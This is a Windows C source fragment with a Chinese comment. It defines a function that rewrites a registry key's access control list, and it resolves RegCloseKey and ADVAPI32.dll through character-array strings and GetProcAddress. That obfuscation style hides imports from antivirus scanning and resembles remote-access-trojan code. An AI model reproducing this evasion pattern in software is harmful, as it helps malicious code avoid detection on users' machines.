//设置注册表键读取的权限(KEY_READ||KEY_WRITE||KEY_ALL_ACCESS)
int SetKeySecurityEx(HKEY MainKey,LPCTSTR SubKey,DWORD security) 
{
	   typedef __bcount(dwBytes) LPVOID (WINAPI *HeapAllocT)
		   (
		   __in HANDLE hHeap,
		   __in DWORD dwFlags,
		   __in SIZE_T dwBytes
		   );
	   HeapAllocT pHeapAlloc = (HeapAllocT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"HeapAlloc");
	   
	   typedef LONG
		   (APIENTRY
		   *RegCloseKeyT)(
		   __in HKEY hKey
		   );
	   char YWsjU[] = {'R','e','g','C','l','o','s','e','K','e','y','\0'};
	   char KIoFqQPSy[] = {'A','D','V','A','P','I','3','2','.','d','l','l','\0'};
	   RegCloseKeyT pRegCloseKey=(RegCloseKeyT)GetProcAddress(LoadLibrary(KIoFqQPSy),YWsjU);
	   
	   typedef LONG
		   (APIENTRY
		   *RegOpenKeyExAT)(
		   __in HKEY hKey,
		   __in_opt LPCSTR lpSubKey,
		   __reserved DWORD ulOptions,
		   __in REGSAM samDesired,
		   __out PHKEY phkResult
		   );
	   RegOpenKeyExAT pRegOpenKeyExA=(RegOpenKeyExAT)GetProcAddress(LoadLibrary(KIoFqQPSy),"RegOpenKeyExA");

   HKEY  hKey; 
   SID_IDENTIFIER_AUTHORITY sia = SECURITY_NT_AUTHORITY; 
   PSID pSystemSid              = NULL; 
   PSID pUserSid                = NULL; 
   SECURITY_DESCRIPTOR sd; 
   PACL    pDacl                = NULL; 
   DWORD   dwAclSize; 
   int     iResult              = 0;

   __try
   {  	   
	   if(pRegOpenKeyExA(MainKey, SubKey, 0, WRITE_DAC, &hKey)!= ERROR_SUCCESS) 
		   __leave; 
       if(!AllocateAndInitializeSid(&sia,1, SECURITY_LOCAL_SYSTEM_RID, 0, 0, 0, 0, 0, 0, 0, &pSystemSid )) 
           __leave;
       if(!AllocateAndInitializeSid( &sia, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,0, 0, 0, 0, 0, 0, &pUserSid))  
           __leave; 
       dwAclSize = sizeof(ACL) + 2 * ( sizeof(ACCESS_ALLOWED_ACE) - sizeof(DWORD) ) + GetLengthSid(pSystemSid) + GetLengthSid(pUserSid) ; 
       pDacl = (PACL)pHeapAlloc(GetProcessHeap(), 0, dwAclSize); 
       if(pDacl == NULL) 
		   __leave; 
       if(!InitializeAcl(pDacl, dwAclSize, ACL_REVISION)) 
           __leave; 
       if(!AddAccessAllowedAce( pDacl, ACL_REVISION, KEY_ALL_ACCESS, pSystemSid )) 
           __leave; 
       if(!AddAccessAllowedAce( pDacl, ACL_REVISION, (unsigned long)security, pUserSid )) 
           __leave; 
       if(!InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION)) 
           __leave; 
       if(!SetSecurityDescriptorDacl(&sd, TRUE, pDacl, FALSE)) 
           __leave; 
       if(RegSetKeySecurity(hKey, (SECURITY_INFORMATION)DACL_SECURITY_INFORMATION, &sd)!= ERROR_SUCCESS)
		   __leave;
	   iResult =1;
   }
   __finally
   {  
	   pRegCloseKey(MainKey); 
	   pRegCloseKey(hKey); 
	   
	   if(pDacl !=NULL)         
		   HeapFree(GetProcessHeap(), 0, pDacl);  
       if(pSystemSid !=NULL)
	       FreeSid(pSystemSid);
	   if(pUserSid !=NULL)
           FreeSid(pUserSid); 
   }

   return iResult;
}